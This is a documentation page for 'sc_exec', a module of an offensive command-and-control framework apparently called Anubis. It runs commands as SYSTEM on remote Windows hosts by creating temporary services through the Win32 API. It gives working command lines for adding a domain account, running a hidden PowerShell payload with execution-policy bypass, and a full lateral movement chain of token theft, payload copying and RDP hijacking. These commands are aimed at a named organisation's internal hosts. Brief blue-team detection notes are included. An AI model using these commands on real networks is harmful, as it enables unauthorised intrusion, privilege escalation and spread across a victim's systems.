+++
title = "sc_exec"
chapter = false
weight = 120
hidden = false
+++

## Summary

Executes a command as **SYSTEM** on a remote Windows host via the Service Control Manager API — without spawning `sc.exe`. Creates a temporary service, starts it, and deletes it automatically after execution.

- **Platform**: Windows only
- **Needs Admin**: No (requires local admin on **target**)
- **MITRE ATT&CK**: T1021.002, T1543.003
- **Dependencies**: Pure ctypes (advapi32)
- **Version**: 1.0
- **Author**: @wtechsec

### Arguments

#### target *(required)*
- IP address or hostname of the remote host.

#### command *(required)*
- Command to execute as SYSTEM. Redirect stdout for output capture.
- Example: `whoami > C:\Windows\Temp\o.txt 2>&1`

#### username *(optional)*
- Explicit NTLM credential for `OpenSCManager` (`DOMAIN\user`). Empty = current thread token.

#### password *(optional)*
- Password for explicit auth.

#### svc_name *(optional)*
- Service name. Empty = 8-char hex random. Deleted after execution.

## Usage

```
# Modo token implícito (após token_steal)
token_steal 1884
sc_exec 10.12.193.4 "whoami > C:\Windows\Temp\o.txt 2>&1"
download 10.12.193.4 C:\Windows\Temp\o.txt

# Modo credencial explícita
sc_exec 10.12.193.4 "net user hacker P@ss123 /add /domain" COPEL\administrator Senha@123

# Deploy de agente Anubis como SYSTEM no host lateral
sc_exec 10.12.193.4 "powershell -ep bypass -WindowStyle Hidden -f C:\Windows\Temp\a.ps1"
```

## Technique Detail

```
1. [opcional] LogonUserW(user, domain, pass, LOGON_NEW_CREDENTIALS)
             ImpersonateLoggedOnUser(token)

2. OpenSCManagerW("\\target", NULL, SC_MANAGER_ALL_ACCESS)

3. CreateServiceW(
       hSCM,
       svc_name,                     ← randômico (8 hex chars)
       svc_name,
       SERVICE_ALL_ACCESS,
       SERVICE_WIN32_OWN_PROCESS,
       SERVICE_DEMAND_START,
       SERVICE_ERROR_IGNORE,
       "C:\Windows\System32\cmd.exe /c <command>",
       NULL, NULL, NULL,
       NULL,                          ← LocalSystem = SYSTEM
       NULL
   )

4. StartServiceW(hSvc, 0, NULL)     ← executa como SYSTEM
   time.sleep(3)                     ← aguarda término do comando

5. DeleteService(hSvc)              ← auto-cleanup
   CloseServiceHandle × 2
   [RevertToSelf se impersonando]
```

## MITRE ATT&CK Mapping

- **T1021.002** — Remote Services: SMB/Windows Admin Shares
- **T1543.003** — Create or Modify System Process: Windows Service

## Notes

- **Sem sc.exe:** a implementação usa diretamente a API Win32 `advapi32`. Não gera processo filho `sc.exe`.
- **Executa como SYSTEM:** o serviço é criado com `lpServiceStartName=NULL`, o que força execução como `NT AUTHORITY\SYSTEM` no host remoto.
- **Auto-cleanup:** o serviço é deletado após 3 segundos. Gera Event ID 7045 (criação) e 7036/7009 (início/timeout) — todos no host **alvo**.
- **Erro 1053 esperado:** `cmd.exe` não envia sinal de "service started" ao SCM — o Anubis trata esse erro como execução bem-sucedida.
- **Requisito de rede:** TCP/445 (SMB pipe `svcctl`) para comunicação com o SCM remoto.
- **Detecção (blue team):** Sysmon EID 1 (process create no alvo), Security EID 4697 (service install), System EID 7045.

### Lateral Movement Flow (COPEL context)

```
# P483078 comprometido → deploy no P489039 (Win11)

token_steal                    # lista tokens disponíveis
token_steal 1884               # impersona domain admin (ex: Oracle service account)

# Copia payload via share (token impersonado)
shell copy C:\Temp\a.ps1 \\10.12.193.4\C$\Windows\Temp\a.ps1

# Executa como SYSTEM via SCM (sem sc.exe)
sc_exec 10.12.193.4 "powershell -ep bypass -f C:\Windows\Temp\a.ps1"

# Novo agente Anubis agora roda como SYSTEM no P489039
rdp_hijack          # lista sessões RDP no novo host
```

---

## Resumo em Português (PT-BR)

Executa comandos como **SYSTEM** em hosts Windows remotos via API do Service Control Manager sem usar `sc.exe`. Cria um serviço temporário com nome aleatório, executa o comando e deleta o serviço automaticamente.

| Modo | Configuração | Quando usar |
|---|---|---|
| **Token implícito** | username/password vazios | Após `token_steal` impersonar domain admin |
| **Credencial explícita** | `DOMAIN\user` + password | Quando hash/senha estão disponíveis |

### Eventos gerados no alvo (Blue Team)
- System Event ID **7045**: "A service was installed"
- System Event ID **7036/7009**: service started/timeout
- Security Event ID **4697**: service installed (se auditoria habilitada)
- Sysmon Event ID **1**: `cmd.exe /c <command>` spawned by services.exe
